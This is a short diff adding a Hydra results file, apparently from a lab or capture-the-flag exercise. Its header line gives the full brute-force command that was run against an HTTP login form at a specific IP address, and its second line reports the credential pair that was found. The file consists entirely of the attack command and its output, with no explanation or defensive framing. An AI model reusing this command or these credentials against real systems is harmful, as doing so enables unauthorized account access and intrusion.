@@ -1,0 +1,2 @@
+# Hydra v8.6 run at 2020-05-05 15:43:07 on 34.94.3.143 http-post-form (hydra -L usernames.txt -p password -t 10 -w 30 -o hydra-http-post-attack.txt -vV -f 34.94.3.143 http-post-form /2f952e7ee9/login:username=^USER^&password=^PASS^:Invalid username)
+[80][http-post-form] host: 34.94.3.143   login: kary   password: password
